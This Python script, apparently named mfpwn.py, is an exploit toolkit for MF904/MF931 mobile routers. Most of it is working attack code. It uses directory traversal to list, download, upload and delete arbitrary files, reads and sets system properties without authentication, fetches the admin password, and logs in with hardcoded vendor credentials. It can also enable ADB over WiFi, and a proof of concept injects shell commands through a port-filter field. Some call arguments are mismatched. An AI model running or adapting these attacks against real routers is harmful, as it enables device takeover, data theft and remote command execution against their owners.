import requests
import json
import time
import base64
import random
from datetime import datetime
import os
from goform import *
import re
from util import *
import sys
import math
import argparse

def current_milli_time():
    return round(time.time() * 1000)

def print_nice_response(response_body):
    # Parse the JSON response body
    response_json = json.loads(response_body)

    # Print the nicely formatted output
    result = response_json.get("result", {})
    file_info_list = result.get("fileInfo", [])
    total_record = result.get("totalRecord", "")

    info(f"Total Records: {total_record}")
    info("File Info:")
    for file_info in file_info_list:
        file_name = file_info.get("fileName", "N/A")
        attribute = file_info.get("attribute", "N/A")
        size = file_info.get("size", "N/A")
        last_update_time = file_info.get("lastUpdateTime", "N/A")
        print(f"      File Name: {file_name}")
        print(f"        Attribute: {attribute}")
        print(f"        Size: {size}")
        # print(f"        Last Update Time: {last_update_time}")
    print()


def get_enterfold_entry_count(response_body):
    # Parse the JSON response body
    response_json = json.loads(response_body)

    # Print the nicely formatted output
    result = response_json.get("result", {})
    total_record = result.get("totalRecord", "")

    return int(total_record)

def upload_file(filename, destination, ip, cookie):
    url = f"http://{ip}/uploadfileForm"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookie
    }

    # Get file size
    file_size = os.path.getsize(filename)

    # Prepare URL parameters
    params = {
        "newPath": f"/../../../../../../../..{destination}/{filename.split('/')[-1]}"
    }

    # Prepare the files dictionary with multipart/form-data
    files = {
        'file': ('blob', open(filename, 'rb'), 'application/octet-stream'),
        'filesize': (None, str(file_size))
    }

    # Make the POST request
    response = requests.post(url, headers=headers, params=params, files=files)

    # Print status and response body
    print(f"Status Code: {response.status_code}")
    print(f"Response Body: {response.text}")


def upload_generic_file(filename, destination, ip, cookie):
    info(f"Uploading {filename.split('/')[-1]}...")
    upload_file(filename, destination, ip, cookie)


def goform_get(cmd, ip, cookie):
    url = f"http://{ip}/goform/goform_get_cmd_process?multi_data=1&cmd={cmd}"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookie
    }

    info(f"Sending HTTP GET to {url}")

    response = requests.post(url, headers=headers)

    # Check the status code of the response
    if response.status_code != 200:
        print(f"Failed to retrieve data. Status code: {response.status_code}")
        return

    # Try to parse the result as JSON
    try:
        data = response.json()
    except json.JSONDecodeError:
        data = response.text  # If parsing fails, leave data as a string

    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {data}")


def get_file_form(filename, ip, cookie):
    url = f"http://{ip}/getfileForm?filename=../../../../../../..{filename}"
    info(f"Requesting from {url}")
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookie
    }

    response = requests.post(url, headers=headers)
    info(f"Status Code: {response.status_code}")
    # info(f"Response Body: {response.text}")

    return response.content


def enable_adb(ip, cookie):
    url = f"http://{ip}/adbWifiDebugForm.do"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Content-Length": "47",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookie # this changes every reboot, need to reverse
    }

    data = f"adb=1"

    info(f"Sending {data} to {url}")

    response = requests.post(url, headers=headers, data=data)
    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {response.text}")


def set_gpio(ip, cookie):
    url = f"http://{ip}/gpio.do"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Content-Length": "47",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookie # this changes every reboot, need to reverse
    }

    data = f"lr_gpio=0&"

    info(f"Sending {data} to {url}")

    response = requests.post(url, headers=headers, data=data)
    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {response.text}")


def get_system_property(property, ip, cookie):
    url = f"http://{ip}/propertiesForm.do"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Content-Length": "47",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookie # this changes every reboot, need to reverse
    }

    data = f"action=get&prop={property}"

    response = requests.post(url, headers=headers, data=data)
    # info(f"Status Code: {response.status_code}")
    # info(f"Response Body: {response.text}")

    return response.text


def set_system_property(property, value, ip, cookie):
    url = f"http://{ip}/propertiesForm.do"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Content-Length": "47",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookie # this changes every reboot, need to reverse
    }

    data = f"action=set&prop={property}&val={value}"

    response = requests.post(url, headers=headers, data=data)
    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {response.text}")


def list_full_directory(directory_path, router_ip, cookie):
    entry_count = get_enterfold_entry_count(goform_set(GOFORM_HTTPSHARE_ENTERFOLD(f"/../../../../../..{directory_path}", "1"), router_ip, cookie))

    if entry_count == 0:
        info("Directory is empty!")
        return

    page_count = math.ceil(entry_count/10)

    print(f"Entry count: {entry_count}, page count: {page_count}")

    responses = []

    for page in range(0, page_count):
        response_body = goform_set(GOFORM_HTTPSHARE_ENTERFOLD(f"/../../../../../..{directory_path}", str(page+1)), router_ip, cookie)

        # Parse the JSON response body
        response_json = json.loads(response_body)

        # Print the nicely formatted output
        result = response_json.get("result", {})
        file_info_list = result.get("fileInfo", [])
        total_record = result.get("totalRecord", "")

        info(f"Total Records: {total_record}")
        info("File Info:")
        for file_info in file_info_list:
            file_name = file_info.get("fileName", "N/A")
            attribute = file_info.get("attribute", "N/A")
            size = file_info.get("size", "N/A")
            last_update_time = file_info.get("lastUpdateTime", "N/A")
            
            responses.append([file_name, attribute, size, last_update_time])
        print()

    info(f"Files in {directory_path}")
    for response in responses:
        print(f"      File Name: {response[0]}")
        print(f"        Attribute: {response[1]}")
        # print(f"        Size: {response[2]}")
        # print(f"        Last Update Time: {response[3]}")

def download_directory(directory_path, router_ip, cookie):
    if directory_path[-1] == '/' and directory_path != '/':
        bad("Make sure directory path does not end with /")
        return

    if directory_path[0] != '/':
        bad("Make sure directory path starts with /")
        return

    # We can use directory traversal to download everything
    entry_count = get_enterfold_entry_count(goform_set(GOFORM_HTTPSHARE_ENTERFOLD(f"/../../../../../..{directory_path}", "1"), router_ip, cookie))

    if entry_count == 0:
        info("Directory is empty!")
        return

    page_count = math.ceil(entry_count / 10)

    info(f"Entry count: {entry_count}, page count: {page_count}")

    filenames = []

    for page in range(0, page_count):
        response_body = goform_set(GOFORM_HTTPSHARE_ENTERFOLD(f"/../../../../../..{directory_path}", str(page + 1)), router_ip, cookie)

        # Parse the JSON response body
        response_json = json.loads(response_body)

        # Print the nicely formatted output
        result = response_json.get("result", {})
        file_info_list = result.get("fileInfo", [])

        for file_info in file_info_list:
            file_name = file_info.get("fileName", "N/A")
            attribute = file_info.get("attribute", "N/A")

            # print(file_name)
            if len(attribute) == 0:
                filenames.append(file_name)
            elif attribute == "document" and file_name not in ['proc', 'dev', 'sys', 'mdlog']:
                download_directory(directory_path + '/' + file_name, router_ip, cookie)

    base_dir = os.path.join(os.getcwd(), "files", directory_path.lstrip('/'))

    # Create the base directory if it does not exist
    if not os.path.exists(base_dir):
        os.makedirs(base_dir)

    for filename in filenames:
        file_path = f"{directory_path}/{filename}"
        file_content = get_file_form(f"../../../../../..{file_path}", router_ip, cookie)

        # Ensure the directory exists
        local_file_dir = os.path.join(base_dir, os.path.dirname(filename))
        if not os.path.exists(local_file_dir):
            os.makedirs(local_file_dir)

        # Write the file content to the appropriate location
        local_file_path = os.path.join(base_dir, filename)
        with open(local_file_path, 'wb') as file:
            file.write(file_content)

    info("Download complete!")


def main():
    print_ascii_art()

    # define main parser
    parser = argparse.ArgumentParser(prog='python3 mfpwn.py',
                    description='Note: Only tested on MF904 and MF931')

    subparsers = parser.add_subparsers(dest='command', help='Available functions')

    parser.add_argument("-router_ip",
                    type=str,
                    required=False,
                    help="IP of the router",
                    default="192.168.2.1")

    parser.add_argument("-admin_username",
                    type=str,
                    required=False,
                    help="admin username of the router",
                    default="admin")

    parser.add_argument("-admin_pwd",
                    type=str,
                    required=False,
                    help="admin password of the router",
                    default="admin")

    # define parser for enterfold command
    enterfold_parser = subparsers.add_parser('enterfold', 
                    help='Lists the contents of directory using directory traversal bug')
    enterfold_parser.add_argument("path",
                    type=str,
                    help="path of the directory you wish to list")

    # define parser for download_directory command
    download_directory_parser = subparsers.add_parser('download_directory', 
                    help='Download specified directory from router')
    download_directory_parser.add_argument("path",
                    type=str,
                    help="path of the directory you wish to download")

    # define parser for upload_file
    upload_file_parser = subparsers.add_parser('upload_file', 
                    help='uploads specified file to path')
    upload_file_parser.add_argument("path",
                    type=str,
                    help="the path of the file you wish to upload")
    upload_file_parser.add_argument("destination_directory",
                    type=str,
                    help="the directory the path will end up in")

    # define parser for goform_get
    goform_get_parser = subparsers.add_parser('goform_get', 
                    help='fetch the specified value from goform get')
    goform_get_parser.add_argument("key",
                    type=str,
                    help="path of the directory you wish to download")

    # define parser for system_property_get
    sys_prop_get_parser = subparsers.add_parser('sys_prop_get', 
                    help='fetch the specified system property from the router')
    sys_prop_get_parser.add_argument("key",
                    type=str,
                    help="name of the system property you wish to fetch")

    # define parser for system_property_set
    sys_prop_set_parser = subparsers.add_parser('sys_prop_set', 
                    help='set the specified system property from the router to the specified value')
    sys_prop_set_parser.add_argument("key",
                    type=str,
                    help="name of the system property you wish to set")
    sys_prop_set_parser.add_argument("value",
                    type=str,
                    help="value of the system property you wish to set")

    # define parser for get_file_form
    get_file_form_parser = subparsers.add_parser('get_file_form', 
                    help='fetch the specified file from the router')
    get_file_form_parser.add_argument("path",
                    type=str,
                    help="path of the file you wish to fetch")

    # define parser for enable_adb
    enable_adb_parser = subparsers.add_parser('enable_adb', 
                    help='enable adb over wifi')

    # define parser for get_admin_pwd
    get_admin_pwd_parser = subparsers.add_parser('get_admin_pwd', 
                    help='fetch the admin password using goform get')
    
    # define parser for hardcoded_login
    hardcoded_login_parser = subparsers.add_parser('hardcoded_login', 
                    help='login to the router using hardcoded credentials')

    # define parser for get model
    get_model_parser = subparsers.add_parser('get_info', 
                    help='gets some information about the router')

    # define parser for mkdir
    mkdir_parser = subparsers.add_parser('mkdir',
                    help='creates a directory in specified location (as long as com.android.phone can)')
    mkdir_parser.add_argument("path",
                    type=str,
                    help="absolute path of the directory that will be created")

    # define parser for remove
    remove_parser = subparsers.add_parser('remove',
                    help='creates a directory in specified location (as long as com.android.phone can)')
    remove_parser.add_argument("path",
                    type=str,
                    help="absolute path of the directory containing the file that will be deleted")
    remove_parser.add_argument("filename",
                    type=str,
                    help="filename of file to be deleted")

    # define parser for ip_port_fileter_injection
    ip_port_fileter_injection_parser = subparsers.add_parser('ip_port_fileter_injection', 
                    help='PoC for post auth cmd injection in ADD_IP_PORT_FILETER')
    ip_port_fileter_injection_parser.add_argument("cmd",
                    type=str,
                    help="command to be injected")

    # run once arguments parsed
    arguments = parser.parse_args()

    if arguments.command == 'enterfold':
        cookie = goform_login(GOFORM_LOGIN_NEW(arguments.admin_username, arguments.admin_pwd), arguments.router_ip)
        list_full_directory(arguments.path, arguments.router_ip, cookie)
    elif arguments.command == 'download_directory':
        cookie = goform_login(GOFORM_LOGIN_NEW(arguments.admin_username, arguments.admin_pwd), arguments.router_ip)
        download_directory(arguments.path, arguments.router_ip, cookie)
    elif arguments.command == 'upload_file':
        cookie = goform_login(GOFORM_LOGIN_NEW(arguments.admin_username, arguments.admin_pwd), arguments.router_ip)
        upload_generic_file(arguments.destination_directory, arguments.router_ip, cookie)
    elif arguments.command == 'goform_get':
        goform_get(arguments.key, arguments.router_ip, '') # no cookie needed
    elif arguments.command == 'sys_prop_get':
        info(get_system_property(arguments.key, arguments.router_ip, '')) # no cookie needed
    elif arguments.command == 'sys_prop_set':
        set_system_property(arguments.key, arguments.value, arguments.router_ip, '') # no cookie needed
    elif arguments.command == 'get_file_form':
        file_data = get_file_form(arguments.path, arguments.router_ip, '') # no cookie needed
        info(file_data)
    elif arguments.command == 'enable_adb':
        cookie = goform_login(GOFORM_LOGIN_NEW(arguments.admin_username, arguments.admin_pwd), arguments.router_ip)
        enable_adb(arguments.router_ip, cookie)
    elif arguments.command == 'get_admin_pwd':
        goform_get("admin_Password", arguments.router_ip, '')
    elif arguments.command == 'hardcoded_login':
        goform_login(GOFORM_LOGIN_NEW("hebangadmin", "hebangadmin"), arguments.router_ip)
    elif arguments.command == 'get_info':
        info(get_system_property('ro.hardware.version', arguments.router_ip, ''))
        info(get_system_property('ro.product.model', arguments.router_ip, ''))
        info(get_system_property('ro.build.product', arguments.router_ip, ''))
        info(get_system_property('ro.build.date', arguments.router_ip, ''))
        info(get_system_property('ro.build.fingerprint', arguments.router_ip, ''))
        info(get_system_property('ro.build.order.id', arguments.router_ip, '')) # no cookie needed
        info(get_system_property('ro.bootimage.build.date', arguments.router_ip, '')) # no cookie needed
        info(get_system_property('ro.hardware', arguments.router_ip, '')) # no cookie needed
    elif arguments.command == 'ip_port_fileter_injection':
        cookie = goform_login(GOFORM_LOGIN_NEW(arguments.admin_username, arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_ADD_IP_PORT_FILETER("00:00:00:00:00:00", "", "", 1234, 1235, 1236, 1237, "Drop", "UDP", f" ; {arguments.cmd} ; "), arguments.router_ip, cookie)
    elif arguments.command == 'mkdir':
        cookie = goform_login(GOFORM_LOGIN_NEW(arguments.admin_username, arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_HTTPSHARE_NEW(f"//../../../../../../../..{arguments.path}", "2024-08-08 22:22:22", "1723151393"), arguments.router_ip, cookie)
    elif arguments.command == 'remove':
        cookie = goform_login(GOFORM_LOGIN_NEW(arguments.admin_username, arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_HTTPSHARE_DEL(f"//../../../../../../../..{arguments.path}", arguments.filename), arguments.router_ip, cookie)
    elif arguments.command == 'test':
        ...

    ## These may also be vulerable to cmd injection, but needs to have a WAN address and I dont have a spare SIM
    # try:
    #     if (arguments[0] == '-dmz_injection'): # idk if this works as no sim card rip
    #         cookie = goform_login(GOFORM_LOGIN_NEW(admin_username, admin_password), router_ip)
    #         goform_set(GOFORM_DMZ_SETTING("1", "test && touch /data/local/tmp/pwned ;"), router_ip, cookie)
    #     elif (arguments[0] == '-add_port_map_injection'): # idk if this works as no sim card rip
    #         cookie = goform_login(GOFORM_LOGIN_NEW(admin_username, admin_password), router_ip)
    #         goform_set(GOFORM_ADD_PORT_MAP_NEW("1", "1234", "127.0.0.1", "4321", "UDP", "suck ur mum"), router_ip, cookie)
        
    # except Exception as e:
    #     bad(f"Exception occured:\n    {str(e)}")


if __name__ == "__main__":
    main()
